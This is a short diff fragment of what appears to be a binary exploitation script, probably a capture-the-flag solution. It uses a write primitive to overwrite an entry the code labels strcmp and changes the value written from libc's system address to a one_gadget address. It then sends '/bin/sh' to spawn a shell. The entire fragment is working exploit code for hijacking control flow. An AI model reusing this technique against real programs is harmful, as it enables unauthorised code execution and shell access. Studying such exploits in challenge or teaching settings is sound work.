@@ -130,7 +130,7 @@ system = libc_base + 0x45390
 one_gadget = libc_base + 0x4526a
 
 # write to strcmp
-write_where(codebase + 0x2050a0, p64(system))
+write_where(codebase + 0x2050a0, p64(one_gadget))
 
 send_cmd("/bin/sh")
 
